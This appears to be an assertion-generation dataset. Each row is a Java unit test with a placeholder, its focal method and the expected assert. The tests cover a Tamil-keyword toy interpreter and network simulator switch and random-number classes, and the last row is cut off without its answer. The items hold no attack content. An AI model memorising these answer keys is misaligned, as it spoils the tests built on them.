"interpretPrintExpression() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது '123';""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""123"", getWithoutLines(baos))"
"interpretAdditionExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 1 + 2;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""3.0"",getWithoutLines(baos))"
"interpretSubtractionExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 1 - 2;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""-1.0"",getWithoutLines(baos))"
"interpretMulExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 1 * 2;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""2.0"",getWithoutLines(baos))"
"interpretDivExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 4/2;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""2.0"",getWithoutLines(baos))"
"interpretGroupedAddExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது (1 + 2) + (3-4);""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""2.0"",getWithoutLines(baos))"
"interpretGroupedMulExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது (1 * 2) + (4 / 2);""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""4.0"",getWithoutLines(baos))"
"interpretModuloExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 % 9;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""1.0"",getWithoutLines(baos))"
"interpretUnaryExpr() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது -10;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""-10.0"",getWithoutLines(baos))"
"interpretGreaterThanSign() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 > 20;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""பொய்"",getWithoutLines(baos))"
"interpretGreaterThanEqualToSign() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 >= 10;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""உண்மை"",getWithoutLines(baos))"
"interpretLesserThanSign() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 < 20;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""உண்மை"",getWithoutLines(baos))"
"interpretLesserThanEqualToSign() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 <= 10;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""உண்மை"",getWithoutLines(baos))"
"interpretVariableAssignmentShouldWorkCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10; எழுது எ;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretVariableAssignmentShouldWorkCorrectlyForString() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10; எழுது எ;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretVariableReassignShouldWorkCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = '10';"" + ""மாறி அ;"" + ""அ = எ;"" + ""எழுது அ;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10"",getWithoutLines(baos))"
"interpretVariableReassignInScopeShouldWorkCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = '10';"" + ""{ மாறி எ; எ = '30'; }"" + ""எழுது எ;""); ""<AssertPlaceHolder>"";  }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10"",getWithoutLines(baos))"
"interpretIfLoopCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 10) {  எழுது எ; }""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretIfElseLoopCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 11) {  எழுது எ; } இல்லையென்றால் {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretOrOperatorWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 11 || எ == 10 ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretOrOperatorKeywordWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 11 அல்லது எ == 10 ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretAndOperatorWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ < 11 && எ == 10 ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretAndOperatorKeywordWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ < 11 மற்றும் எ == 10 ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretWhileLoopCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""இருப்பின்(எ > 0) { எழுது எ; எ = எ - 1; }""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.09.08.07.06.05.04.03.02.01.0"",getWithoutLines(baos))"
"interpretForLoopCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret( ""ஆக(மாறி எ = 1; எ < 5; எ = எ + 1) { எழுது எ; }""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""1.02.03.04.0"",getWithoutLines(baos))"
"interpretDecimalCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10.01;""  + ""எ = எ + 0.01; எழுது எ;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.02"",getWithoutLines(baos))"
"interpretTrueKeywordWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 10 == உண்மை ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretFalseKeywordWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 11 == பொய் ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretSingleLineCommentCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""// anything here should be ignored for single line ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals("""",getWithoutLines(baos))"
"interpretSingleLineCommentCorrectlyWithPrintStatement() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""// anything here should be ignored for single line \n "" + ""எழுது '123';""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""123"",getWithoutLines(baos))"
"interpretStringConcatCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது '123' + '45';""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""12345"",getWithoutLines(baos))"
"testSameSeed() {  RandomManager manager1 = new RandomManager(300); RandomManager manager2 = new RandomManager(300);  Random r1 = manager1.getRandom(""test""); Random r2 = manager2.getRandom(""test"");  for (int i = 0; i < 1000; i++) { ""<AssertPlaceHolder>""; }  }
getRandom(String key) {  // Keys are issued typically once if (issuedKeys.contains(key)) { throw new IllegalArgumentException(""Unlikely wanted to ask for the same key twice in the same runtime.""); } issuedKeys.add(key);  // Generate issued seed long issuedSeed = 997 * universalSeed ^ 991 * key.hashCode();  // Prevent that by chance it is a duplicate (safeguard) if (issuedSeeds.contains(issuedSeed)) { throw new IllegalArgumentException(""Likely undesirable: duplicate seed created from two different keys.""); } issuedSeeds.add(issuedSeed);  // Create independent random number generator issuedSeeds.add(issuedSeed); return new Random(issuedSeed);  }"	assertEquals(r1.nextLong(), r2.nextLong())
"testRequestAgain() {  RandomManager manager = new RandomManager(300); manager.getRandom(""test""); boolean thrown = false; try { manager.getRandom(""test""); } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>"";  }
getRandom(String key) {  // Keys are issued typically once if (issuedKeys.contains(key)) { throw new IllegalArgumentException(""Unlikely wanted to ask for the same key twice in the same runtime.""); } issuedKeys.add(key);  // Generate issued seed long issuedSeed = 997 * universalSeed ^ 991 * key.hashCode();  // Prevent that by chance it is a duplicate (safeguard) if (issuedSeeds.contains(issuedSeed)) { throw new IllegalArgumentException(""Likely undesirable: duplicate seed created from two different keys.""); } issuedSeeds.add(issuedSeed);  // Create independent random number generator issuedSeeds.add(issuedSeed); return new Random(issuedSeed);  }"	assertTrue(thrown)
"testConstructionDuplicate() {  // Create an ECMP switch with port 0 to 1... device0 = new EcmpSwitch(0, null, 5, new IdentityFlowletIntermediary()); device0.addConnection(topology.getPort(0, 1)); device0.addDestinationToNextSwitch(1, 1);  // ... and try to add the same destination to switch again boolean thrown = false; try { device0.addDestinationToNextSwitch(1, 1); } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>"";  }
addDestinationToNextSwitch(int destinationId, int nextHopId) {  // Check for not possible identifier if (!connectedTo.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add hop to a network device to which it is not connected ("" + nextHopId + "")""); }  // Check for duplicate List<Integer> current = this.destinationToNextSwitch.get(destinationId); if (current.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add a duplicate next hop network device identifier ("" + nextHopId + "")""); }  // Add to current ones current.add(nextHopId);  }"	assertTrue(thrown)
"testConstructionNonExisting() {  // Create switch with 1->0, 1->2, and 1->3 device1 = new EcmpSwitch(1, null, 5, new IdentityFlowletIntermediary()); device1.addConnection(topology.getPort(1, 0)); device1.addConnection(topology.getPort(1, 2)); device1.addConnection(topology.getPort(1, 3)); device1.addDestinationToNextSwitch(0, 0);  // ... but deny that you can travel to 2 via a non-existing port boolean thrown = false; try { device1.addDestinationToNextSwitch(2, 4); // there is no port to 4 } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>""; }
addDestinationToNextSwitch(int destinationId, int nextHopId) {  // Check for not possible identifier if (!connectedTo.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add hop to a network device to which it is not connected ("" + nextHopId + "")""); }  // Check for duplicate List<Integer> current = this.destinationToNextSwitch.get(destinationId); if (current.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add a duplicate next hop network device identifier ("" + nextHopId + "")""); }  // Add to current ones current.add(nextHopId);  }"	assertTrue(thrown)
"testSingleForwardTwoOptions() {  for (int i = 0; i < 2; i++) { when(packet.getHash(any(Integer.class))).thenReturn(i);  ArgumentCaptor<Packet> captor = ArgumentCaptor.forClass(Packet.class);  // Send packet from 1 to 4, there are two options when(packet.getDestinationId()).thenReturn(4);  device1.receive(packet); verify(topology.getPort(1, 2), atMost((i + 1) % 2)).enqueue(captor.capture()); verify(topology.getPort(1, 3), atMost(i % 2)).enqueue(captor.capture()); reset(topology.getPort(1, 2), topology.getPort(1, 3));  // Only one decision can have been made ""<AssertPlaceHolder>"";  }  }
receive(Packet genericPacket) {  // Convert to TCP packet TcpHeader tcpHeader = (TcpHeader) genericPacket;  // Check if it has arrived if (tcpHeader.getDestinationId() == this.identifier) {  // Hand to the underlying server this.passToIntermediary(genericPacket); // Will throw null-pointer if this network device does not have a server attached to it  } else {  // Forward to the next switch List<Integer> possibilities = destinationToNextSwitch.get(tcpHeader.getDestinationId()); this.targetIdToOutputPort.get(possibilities.get(tcpHeader.getHash(this.identifier) % possibilities.size())).enqueue(genericPacket); //            System.out.println(""Switch forwarding...""); }  }"	assertEquals(1, captor.getAllValues().size())
"testToString() { ""<AssertPlaceHolder>""; }
toString() { StringBuilder builder = new StringBuilder(); builder.append(""ValiantSwitch<id=""); builder.append(getIdentifier()); builder.append("", connected=""); builder.append(connectedTo); builder.append("", routing: ""); for (int i = 0; i < destinationToNextSwitch.size(); i++) { if (i != 0) { builder.append("", ""); } builder.append(i); builder.append(""->""); builder.append(destinationToNextSwitch.get(i)); } builder.append("">""); return builder.toString(); }"	assertNotNull(device4.toString())
"testInstNonExistingPort() { boolean thrown = false; try { ForwarderSwitch device = new ForwarderSwitch(0, null, 5, new IdentityFlowletIntermediary()); device.addConnection(topology.getPort(0, 1)); device.setDestinationToNextSwitch(1, 2); } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>""; }
setDestinationToNextSwitch(int destinationId, int nextHopId) { if (!connectedTo.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add hop to a network device to which it is not connected ("" + nextHopId + "")""); } this.destinationToNextSwitch[destinationId] = nextHopId; }"	assertTrue(thrown)
"testToString() { ForwarderSwitch device = new ForwarderSwitch(3, null, 5, new IdentityFlowletIntermediary()); device.addConnection(topology.getPort(3, 1)); device.addConnection(topology.getPort(3, 4)); device.setDestinationToNextSwitch(0, 1); device.setDestinationToNextSwitch(1, 1); device.setDestinationToNextSwitch(2, 4); device.setDestinationToNextSwitch(4, 4); ""<AssertPlaceHolder>""; }
toString() { StringBuilder builder = new StringBuilder(); builder.append(""ForwarderSwitch<id=""); builder.append(getIdentifier()); builder.append("", connected=""); builder.append(connectedTo); builder.append("", routing: ""); for (int i = 0; i < destinationToNextSwitch.length; i++) { if (i != 0) { builder.append("", ""); } builder.append(i); builder.append(""->""); builder.append(destinationToNextSwitch[i]); } builder.append("">""); return builder.toString(); }"	assertNotNull(device.toString())
"testIdentityIncoming() { UniformFlowletIntermediary intermediary = new UniformFlowletIntermediary(); ""<AssertPlaceHolder>""; verifyZeroInteractions(packet); }
adaptIncoming(Packet packet) { return packet; }"	assertEquals(packet, intermediary.adaptIncoming(packet))
"testToString() { ""<AssertPlaceHolder>""; }
toString() { StringBuilder builder = new StringBuilder(); builder.append(""\n\nEcmpThenValiantSwitch<switchThreshold="" + switchThresholdBytes + "", id="" + getIdentifier() + "", connected="" + connectedTo + "",\nrouting:\n""); for (int i = 0; i < destinationToNextSwitch.size(); i++) { builder.append(""\tfor "" + i + "" next hops are ""  + destinationToNextSwitch.get(i) + ""\n""); } builder.append("",\ninclusive valiant range: ["" + lowBoundValiantRangeIncl + "", "" + highBoundValiantRangeIncl + ""]\n""); builder.append("">\n\n""); return builder.toString(); }"	assertNotNull(device2identity.toString())
"testAddInvalidNegativeWeight() { RandomCollection<Integer> rc = new RandomCollection<>(random);  boolean thrown = false; try { rc.add(-0.0001, 894); } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>"";  }
add(double weight, E result) { if (weight <= 0) { throw new IllegalArgumentException(""Cannot add negative weight ("" + weight + "") to random collection.""); } total += weight; map.put(total, result); }"	assertTrue(thrown)
"testTerribleHashing() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.getHash(eq(4), anyInt())).thenReturn(3);  boolean thrown = false; try { device4identity.receiveFromIntermediary(packet); } catch (RuntimeException e) { thrown = true; } ""<AssertPlaceHolder>"";  }
receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertTrue(thrown)
"testValiantPassNormal() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.isACK()).thenReturn(false);  // Node 4 should receive it, and forward directly, as it is an ACK device4identity.receiveFromIntermediary(packet); ArgumentCaptor<ValiantEncapsulation> captor = ArgumentCaptor.forClass(ValiantEncapsulation.class); verify(topology.getPort(4, 2), atMost(1)).enqueue(captor.capture()); verify(topology.getPort(4, 3), atMost(1)).enqueue(captor.capture()); ""<AssertPlaceHolder>""; // Go valiant verify(layer4, times(0)).receive(packet);  }
receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertFalse(captor.getValue().passedValiant())
"testValiantPassAckData() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.isACK()).thenReturn(true); when(packet.getAcknowledgementNumber()).thenReturn(133L);  // Node 4 should receive it, and forward directly, as it is an ACK device4identity.receiveFromIntermediary(packet); ArgumentCaptor<ValiantEncapsulation> captor = ArgumentCaptor.forClass(ValiantEncapsulation.class); verify(topology.getPort(4, 2), times(0)).enqueue(captor.capture()); verify(topology.getPort(4, 3), times(1)).enqueue(captor.capture()); ""<AssertPlaceHolder>""; // Direct forward verify(layer4, times(0)).receive(packet);  }
receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertTrue(captor.getValue().passedValiant())
"testValiantPassSyn() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.isSYN()).thenReturn(true);  // Node 4 should receive it, and forward directly, as it is an ACK device4identity.receiveFromIntermediary(packet); ArgumentCaptor<ValiantEncapsulation> captor = ArgumentCaptor.forClass(ValiantEncapsulation.class); verify(topology.getPort(4, 2), times(0)).enqueue(captor.capture()); verify(topology.getPort(4, 3), times(1)).enqueue(captor.capture()); ""<AssertPlaceHolder>""; // Direct forward verify(layer4, times(0)).receive(packet);  }
receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertTrue(captor.getValue().passedValiant())
"testValiantPassAckThirdOfHandshake() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.isACK()).thenReturn(true); when(packet.getAcknowledgementNumber()).thenReturn(1L);  // Node 4 should receive it, and forward it valiantly, as it is the third ACK of the handshake and it should preceed the initial window device4identity.receiveFromIntermediary(packet); ArgumentCaptor<ValiantEncapsulation> captor = ArgumentCaptor.forClass(ValiantEncapsulation.class); verify(topology.getPort(4, 2), atMost(1)).enqueue(captor.capture()); verify(topology.getPort(4, 3), atMost(1)).enqueue(captor.capture()); ""<AssertPlaceHolder>""; // Via valiant verify(layer4, times(0)).receive(packet);  }
